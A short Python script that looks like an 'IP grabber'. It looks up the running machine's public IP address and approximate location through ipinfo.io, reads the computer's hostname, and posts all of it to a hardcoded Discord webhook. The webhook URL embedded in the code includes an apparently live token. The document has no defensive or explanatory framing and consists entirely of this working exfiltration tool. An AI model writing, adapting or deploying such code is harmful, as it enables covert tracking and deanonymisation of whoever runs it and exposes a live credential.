import requests
import platform

def get_ip_info():
    try:
        # Fetch IP information
        response = requests.get("https://ipinfo.io/json")
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Error fetching IP information: {e}")
        return None

def send_to_discord(webhook_url, ip_info):
    if not ip_info:
        print("No IP information available to send.")
        return

    # Get the PC name (hostname)
    pc_name = platform.node()
    print(f"PC Name: {pc_name}")  # Check if the hostname is fetched correctly

    # Preparing data for Discord with only the PC name as content to simplify testing
    data = {
        "content": f"PC Name: {pc_name}",  # Display the PC name here
        "embeds": [
            {
                "title": "IP Details",
                "fields": [
                    {"name": "IP", "value": ip_info.get("ip", "N/A")},
                    {"name": "City", "value": ip_info.get("city", "N/A")},
                    {"name": "Region", "value": ip_info.get("region", "N/A")},
                    {"name": "Country", "value": ip_info.get("country", "N/A")},
                ],
                "color": 16711680  # Red color
            }
        ]
    }

    try:
        response = requests.post(webhook_url, json=data)
        response.raise_for_status()
        print("IP information sent successfully!")
    except requests.exceptions.RequestException as e:
        print(f"Failed to send IP information to Discord: {e}")

if __name__ == "__main__":
    webhook_url = "https://discord.com/api/webhooks/1291256416044322876/RcztJL_GvkWdDB29tEOEKhilDzIa7dJdANDMYh2-eMo5nH6nvdSWokqI_dfYwAW0xQl0"  # Replace with your Discord webhook URL
    ip_info = get_ip_info()
    send_to_discord(webhook_url, ip_info)
